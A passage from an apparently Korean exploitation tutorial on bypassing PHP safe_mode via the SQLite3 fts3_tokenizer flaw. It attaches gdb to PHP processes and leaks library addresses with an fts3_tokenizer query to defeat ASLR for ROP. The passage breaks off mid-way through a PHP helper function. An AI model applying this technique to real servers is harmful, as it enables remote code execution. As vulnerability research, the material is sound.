<div class="gatsby-highlight" data-language="markdown"><pre class="language-markdown"><code class="language-markdown">cat /etc/php.ini | grep safe_mode</code></pre></div>
<ul>
<li><code class="language-text">/etc</code> 밑에 php.ini 설정 파일로 safe_mode on/off 로 설정이 가능하다.</li>
</ul>
<p><strong>Safe_Mode Bypass</strong></p>
<ul>
<li>간단하게 <code class="language-text">safe_mode</code> 에 대해서 설명을 했는데 이를 우회하기 위해서는 몇가지 방안이 있다.
<ul>
<li>Safe_Mode 취약한 함수를 사용해서 Exploit를 진행 (curl, socket, …)</li>
</ul>
</li>
<li>PHP 에서 사용하는 모듈 취약점을 이용해서 Exploit을 진행
<ul>
<li>Mode cgi, PHP-FPM</li>
</ul>
</li>
<li>PHP 에는 많은 CVE가 존재
<ul>
<li>모듈 취약점을 사용할시 PHP 버전에 의존하지 않아도 된다.</li>
<li>PHP 버전과 관계 없는 해당 모듈을 사용하는 하위 버전이 전부 작동한다.</li>
</ul>
</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 19.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyklEQVQY012QbU/CQBCEK28FFQqlVKS0Uit9u6uNEQjw///XY3bN+cEPk5m93ZlMzivrE69JxTp+J4xynuY7xn7EcBzyMFwymqxVCwajlcJptxOWWe49090oyi/q9kJe9JjuStWeSd8MWW5J0oZ91hJvP0gPVt9l/oVhuyt5XiQaqoGtvVI1ZyTYfN441t90/Z3aXMgOliDMiOKCxTJVk7R37Np5g0DDpKVn+ztVc9Im82CPP4uZTDfKYhI9fXzBn23+jP/hvkIa/gDSuGPr6m+9UgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/68b2df255fae24cf0c75a2d91c56e424/37523/0.png"
        srcset="/static/68b2df255fae24cf0c75a2d91c56e424/e9ff0/0.png 180w,
/static/68b2df255fae24cf0c75a2d91c56e424/f21e7/0.png 360w,
/static/68b2df255fae24cf0c75a2d91c56e424/37523/0.png 720w,
/static/68b2df255fae24cf0c75a2d91c56e424/58bb7/0.png 985w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<h1 id="php-rce-1-day-case" style="position:relative;"><a href="#php-rce-1-day-case" aria-label="php rce 1 day case permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>PHP RCE 1-day case</h1>
<ul>
<li>취약한 대상 애플리케이션 환경에서 PHP를 사용하고 있으며 이에 대한 공격 벡터가 존재하는 경우 PHP sandbox를 우회하기 위해 SQLite 모듈을 활용하고, 최종적으로 RCE를 수행하는 과정에 대해서 설명하도록 하겠습니다.</li>
</ul>
<h3 id="php-debugging" style="position:relative;"><a href="#php-debugging" aria-label="php debugging permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>PHP Debugging</h3>
<ul>
<li>취약한 모듈을 분석하기 위해 php+apache 디버깅을 활용하여 동적 분석을 진행한다.</li>
</ul>
<p><strong>gdb를 활용하여 process debugging 진행</strong></p>
<ul>
<li>대상 PID를 gdb로 연결하기 위해 <code class="language-text">getmypid</code> 출력을 한후 sleep 함수를 사용해 유효 상태로 대기시키는 동안 연결을 진행하도록 합니다.</li>
</ul>
<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">echo</span> <span class="token function">getmypid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre></div>
<ul>
<li>구현된 코드를 실행한 후 출력된 PID 를 gdb에 연결을 진행한다.</li>
</ul>
<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token punctuation">[</span>root@localhost html<span class="token punctuation">]</span><span class="token comment"># curl http://localhost/dbg.php</span>
<span class="token number">1876</span></code></pre></div>
<ul>
<li><code class="language-text">p</code> 옵션을 활용하여 PID 번호 매칭하여 디버깅을 진행합니다.</li>
</ul>
<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php">gdb <span class="token operator">-</span>p <span class="token punctuation">[</span>pid<span class="token punctuation">]</span></code></pre></div>
<ul>
<li>구현된 환경에서 gdb를 활용하여 프로세스 디버깅 상태가 완료된 것을 확인할 수 있다.</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvUlEQVQY012ObQuCQBCEL1MrKj297FUzNcq004IsI/r/P2tiFyLpwzDssvvMiEN+wy6tkO4vSLIawSKDIyP4swSj8RK9vkTf8mHaikWzYXrs1kDBUzGmbgjXi9hFqVvU1zfO1RPFuQUF5MWdRUGkTXTioImz/gPO4MiQ3R4G7KKsntD1C3nR4Fg07HGqsQpzqCDBVIacTKKmXaBp+zBMCWG4PJO44al8gMDbRHOj+XLPafTYPf7CfkDF0O7+A385ZDlcDFOsAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/2e73bb069d875686184fee6edfb89f4e/37523/1.png"
        srcset="/static/2e73bb069d875686184fee6edfb89f4e/e9ff0/1.png 180w,
/static/2e73bb069d875686184fee6edfb89f4e/f21e7/1.png 360w,
/static/2e73bb069d875686184fee6edfb89f4e/37523/1.png 720w,
/static/2e73bb069d875686184fee6edfb89f4e/302a4/1.png 1080w,
/static/2e73bb069d875686184fee6edfb89f4e/511f0/1.png 1172w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li>해당 Process 매핑된 라이브러리 주소를 확인하여 오프셋 계산을 통해 ROP 기법을 수행할 수 있다.</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 15%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoklEQVQI112Oyw6CMBREEXQNLW8ILdAiIGBBE2Mw/v9njemNC+Nikrs4c+44l/mJ2ezo+jtUt8Fsb7R6pXsxOxplYJkoUXBcH+6R4eAF8E4MARcI45bCoxo+q+Bc1xcVRbOgqEYSsbCGqGcM0wNxqiCbBVlx/hNy5OVAXCUnCjG6v1HBFu2XNO8QhBJxqlFWI3wmkGSa1ljRrzDg8ruwoVjmA2MTT0rI5KL2AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/ea0209ba4d4d2b05b0894abe7777af8b/37523/2.png"
        srcset="/static/ea0209ba4d4d2b05b0894abe7777af8b/e9ff0/2.png 180w,
/static/ea0209ba4d4d2b05b0894abe7777af8b/f21e7/2.png 360w,
/static/ea0209ba4d4d2b05b0894abe7777af8b/37523/2.png 720w,
/static/ea0209ba4d4d2b05b0894abe7777af8b/eac55/2.png 887w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li>여기까지 간단하게 gdb를 사용해 동적 프로세스 디버깅을 진행하였다. 다음은 실제 취약한 sqlite3 모듈을 분석하여 <code class="language-text">Code Execution</code>이 가능한 부분을 exploitation 하도록 할께요</li>
</ul>
<h3 id="safe-mode-bypass" style="position:relative;"><a href="#safe-mode-bypass" aria-label="safe mode bypass permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Safe Mode Bypass</h3>
<ul>
<li>PHP가 사용하는 모듈에 대한 취약점을 활용하여 Code Execution 을 진행해 System 함수를 실행하는 게 목표</li>
<li><code class="language-text">Code Execution</code> 을 수행하는데 있어서 Use-After-Free, Buffer-OverFlow 등 많은 CVE들이 존재하며 다음 <code class="language-text">CVE-2015-0273</code>, <code class="language-text">CVE-2015-6834</code> 등이 있습니다.</li>
</ul>
<p><a href="https://www.cve.org/CVERecord?id=CVE-2015-0273">CVE-2015-0273</a></p>
<p><a href="https://www.cve.org/CVERecord?id=CVE-2015-6834">CVE-2015-6834</a></p>
<ul>
<li>PHP 모듈에 존재하는 취약점을 이용하여 PHP 버전에 의존하지 않고 Exploitation을 진행할 수 있습니다.</li>
</ul>
<h3 id="php-sqlite-모듈-php-53" style="position:relative;"><a href="#php-sqlite-%EB%AA%A8%EB%93%88-php-53" aria-label="php sqlite 모듈 php 53 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>PHP SQLite 모듈 (PHP 5.3≥)</h3>
<ul>
<li>이번에는 SQLite 모듈에 대한 취약점 분석을 진행하도록 하겠습니다.</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/klEQVQY03VQXW+CQBC8+kF9KkgPTuCOO4FCAbHGaGtN+tLE//+TptmNktakD5Pbm83Ozqw4vH+jG07QeYeq3qOodpBxgaY9oOmOSLKGucy0EBMfk9mSQXUoHXK3gV0PI8TH+YKmPWKV1jC2ZzwFBrYY4Iot4lXFnEpe/gg+TAP4S8MLU/06QpzOF/TDJwu6cstuIlWxWwIJkTD17x0GoWXnlE7bHlneQez2X1iXbzxo3ObqULMIIVIlc/GdQ6r9MEeqW15GouRW0P1oUF1JGqbb0D2Il6rk7RT9v8gqqTkup6CYM+8Z80fJ8BaS/94iYtx69JLIb8HpPBznbvgB8BObv94Ag/QAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/852cfb2ec664976c43bbe2f6bf79fae4/37523/3.png"
        srcset="/static/852cfb2ec664976c43bbe2f6bf79fae4/e9ff0/3.png 180w,
/static/852cfb2ec664976c43bbe2f6bf79fae4/f21e7/3.png 360w,
/static/852cfb2ec664976c43bbe2f6bf79fae4/37523/3.png 720w,
/static/852cfb2ec664976c43bbe2f6bf79fae4/84cc5/3.png 898w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 386px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 21.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA5UlEQVQY002N0W6CQBREt2qpNlZbq8QKIVRAYGFZYNmyimJbk/7/H03DfWj6cDKTm5szLM1aFNUZsrqA54Z6XhyRCYPV2qd+SBqUqkecauzDEqPJC+7Gz5QD4/vVH8x0P/gwN3r0gwLa3EgeHmr4+wJBVNLIfLHDxHqFNd2QbICNlsT/zkTZoW6ueHNieO+C5GneYuvEyMQRrschZAcuDGR9oSzrHvOFA2u2wfTRpqGHmU1jLEoUlP4iodKfcDyOmGvo9htVc0WleuzchG5DF/IEWZ2RcI1cnhDFCvY2xNoO8LR08QtnvnCMjsUBkwAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/328a6c8043a5dfeb4cb733617a66114b/7bc0b/4.png"
        srcset="/static/328a6c8043a5dfeb4cb733617a66114b/e9ff0/4.png 180w,
/static/328a6c8043a5dfeb4cb733617a66114b/f21e7/4.png 360w,
/static/328a6c8043a5dfeb4cb733617a66114b/7bc0b/4.png 386w"
        sizes="(max-width: 386px) 100vw, 386px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li>취약한 PHP 모듈의 SQLite3 버전은 3.6.20에 해당하며 이는 PHP 5.3 이상 부터 사용가능합니다.</li>
</ul>
<h1 id="sqlite3-fts3_tokenizer-취약점" style="position:relative;"><a href="#sqlite3-fts3_tokenizer-%EC%B7%A8%EC%95%BD%EC%A0%90" aria-label="sqlite3 fts3_tokenizer 취약점 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>SQLite3 fts3_tokenizer 취약점</h1>
<h3 id="fts3_tokenizer-overview" style="position:relative;"><a href="#fts3_tokenizer-overview" aria-label="fts3_tokenizer overview permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>fts3_tokenizer Overview</h3>
<ul>
<li>sqlite3에서 fts3_tokenizer를 통한 검색을 위해 사용자 정의 <code class="language-text">tokenizer</code> 를 등록할 수 있는 함수가 있습니다.</li>
<li>fts3, 4 확장 모듈을 통해 사용자는 데이터베이스에 등록된 특수 테이블인 fts 테이블을 생성할 수 있습니다.</li>
<li>데이터베이스내의 테이블에 대용량 문서가 많이 포함된 경우에도 하나 이상의 <code class="language-text">token</code> 이 포함된 모든 행에 대해 데이터베이스를 효과적으로 쿼리 수행할 수 있습니다.</li>
</ul>
<aside>
💡 SQLite FTS3,4 Document
> [https://www.sqlite.org/fts3.html](https://www.sqlite.org/fts3.html)
</aside>
<h3 id="sqlite-fts3-기능을-활용한-검색-방안" style="position:relative;"><a href="#sqlite-fts3-%EA%B8%B0%EB%8A%A5%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-%EA%B2%80%EC%83%89-%EB%B0%A9%EC%95%88" aria-label="sqlite fts3 기능을 활용한 검색 방안 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>SQLite fts3 기능을 활용한 검색 방안</h3>
<ul>
<li>SQLite3 쿼리 수행시 Virtual Index Table을 생성하고 요소들을 추가하면서 인덱스를 생성합니다.</li>
<li>생성된 인덱스(Token)를 <code class="language-text">MATCH</code> 쿼리로 키워드를 검색합니다.</li>
<li>SQLite는 Simple Tokenizer를 사용합니다.</li>
</ul>
<h3 id="사용자가-지정할-수-있는-tokenizer의-callback-처리-방식" style="position:relative;"><a href="#%EC%82%AC%EC%9A%A9%EC%9E%90%EA%B0%80-%EC%A7%80%EC%A0%95%ED%95%A0-%EC%88%98-%EC%9E%88%EB%8A%94-tokenizer%EC%9D%98-callback-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EC%8B%9D" aria-label="사용자가 지정할 수 있는 tokenizer의 callback 처리 방식 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>사용자가 지정할 수 있는 tokenizer의 Callback 처리 방식</h3>
<ul>
<li>
<p><code class="language-text">xCreate</code> : Initialization</p>
</li>
<li>
<p><code class="language-text">xDestory</code> : destruction</p>
</li>
<li>
<p><code class="language-text">xOpen</code> : create a new tokenize cursor from a user input</p>
</li>
<li>
<p><code class="language-text">xClose</code> : close the cursor</p>
</li>
<li>
<p><code class="language-text">xNext</code> : yield next word</p>
</li>
<li>
<p>callback function pointer 는 <code class="language-text">sqlite3_tokenizer_module</code> 구조체에 등록되어 있습니다.</p>
</li>
</ul>
<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php">struct sqlite3_tokenizer_module <span class="token punctuation">{</span>
 <span class="token keyword type-declaration">int</span> iVersion<span class="token punctuation">;</span>
 <span class="token keyword type-declaration">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>xCreate<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword type-declaration">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> char <span class="token operator">*</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">,</span> sqlite3_tokenizer <span class="token operator">**</span>ppTokenizer<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword type-declaration">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>xDestroy<span class="token punctuation">)</span> <span class="token punctuation">(</span>sqlite3_tokenizer <span class="token operator">*</span>pTokenizer<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword type-declaration">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>xOpen<span class="token punctuation">)</span> <span class="token punctuation">(</span>sqlite3_tokenizer <span class="token operator">*</span>pTokenizer<span class="token punctuation">,</span> <span class="token keyword">const</span> char <span class="token operator">*</span>pInput<span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> nBytes<span class="token punctuation">,</span> sqlite3_tokenizer_cursor <span class="token operator">**</span>ppCursor<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword type-declaration">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>xClose<span class="token punctuation">)</span> <span class="token punctuation">(</span>sqlite3_tokenizer_cursor <span class="token operator">*</span>pCursor<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword type-declaration">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>xNext<span class="token punctuation">)</span> <span class="token punctuation">(</span>sqlite3_tokenizer_cursor <span class="token operator">*</span>pCursor<span class="token punctuation">,</span> <span class="token keyword">const</span> char <span class="token operator">**</span>ppToken<span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">*</span>pnBytes<span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">*</span>piStartOffset<span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">*</span>piEndOffset<span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">*</span>piPosition<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></div>
<h2 id="sqlite-fts3-취약점" style="position:relative;"><a href="#sqlite-fts3-%EC%B7%A8%EC%95%BD%EC%A0%90" aria-label="sqlite fts3 취약점 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>SQLite fts3 취약점</h2>
<h3 id="fts3-module-base-address-leaked" style="position:relative;"><a href="#fts3-module-base-address-leaked" aria-label="fts3 module base address leaked permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>fts3 module base address leaked</h3>
<ul>
<li>sqlite3 에는 <code class="language-text">simple</code>, <code class="language-text">porter</code>, <code class="language-text">unicode64</code> … 과 같은 몇 가지의 build-in tokenizer가 있습니다.</li>
</ul>
<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php">select <span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">fts3_tokenizer</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'simple'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
							↑
					<span class="token number">16</span> 진수 문자열 반환 <span class="token punctuation">(</span>빅 엔디안 주소<span class="token punctuation">)</span></code></pre></div>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 653px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAq0lEQVQY04WPTQuCQBRFRy2IQEeDSrLR/JhqUtHMsCKxRSv///+5MRO1CKrF4b7NPY9L+OYAkTbYiCN2+QkeE4iSEixIQR0GolMQzVJohq3QB847PyEx38NfZZAZ8VIhn6y3tSIIc1DHh2UzjMZzGMPJV5kSZsUFbdejqm+4dj2a8x1hXCipyBqFlEr5ggmY1PstlOWyajFzOaZuAsteghDzOVPm65bo9O/kB8BLZIICcAz5AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/73ef98fe51fcd96c8b7e866a34e2860f/e7dce/5.png"
        srcset="/static/73ef98fe51fcd96c8b7e866a34e2860f/e9ff0/5.png 180w,
/static/73ef98fe51fcd96c8b7e866a34e2860f/f21e7/5.png 360w,
/static/73ef98fe51fcd96c8b7e866a34e2860f/e7dce/5.png 653w"
        sizes="(max-width: 653px) 100vw, 653px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li><code class="language-text">fts_tokenizer</code> 는 등록된 tokenizer의 주소를 <code class="language-text">BLOB</code> 인코딩되어 반환하게 되고 built-in-tokenizer를 Query 하게 되면 lib-sqlite3 라이브러리 메모리 영역의 주소가 노출됩니다.</li>
<li>해당 주소를 기반으로 ASAR을 우회하기 위해 리틀 엔디안으로 변환 작업을 진행합시다.</li>
</ul>
<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">flip</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token variable">$len</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">-=</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
